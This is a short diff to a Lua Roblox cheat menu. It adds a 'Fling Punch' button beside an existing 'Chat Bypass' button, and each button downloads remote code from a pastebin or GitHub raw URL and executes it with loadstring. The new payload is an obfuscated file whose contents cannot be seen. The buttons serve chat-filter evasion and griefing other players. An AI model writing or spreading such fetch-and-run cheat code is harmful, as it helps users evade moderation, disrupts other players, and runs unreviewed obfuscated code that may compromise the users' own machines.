@@ -372,7 +372,11 @@ end)
 end)
 
 Section:NewButton("Chat Bypass", "You can swear all you want lol", function()
-loadstring(game:HttpGet("https://pastebin.com/raw/T4FEyvHH"))()
+    loadstring(game:HttpGet("https://pastebin.com/raw/T4FEyvHH"))()
+end)
+
+Section:NewButton("Fling Punch", "Very Very Op", function()
+    loadstring(game:HttpGet(('https://raw.githubusercontent.com/0Ben1/fe/main/obf_rf6iQURzu1fqrytcnLBAvW34C9N55kS9g9G3CKz086rC47M6632sEd4ZZYB0AYgV.lua.txt'),true))()
 end)
 
 local Tab = Window:NewTab("Simulator Games")
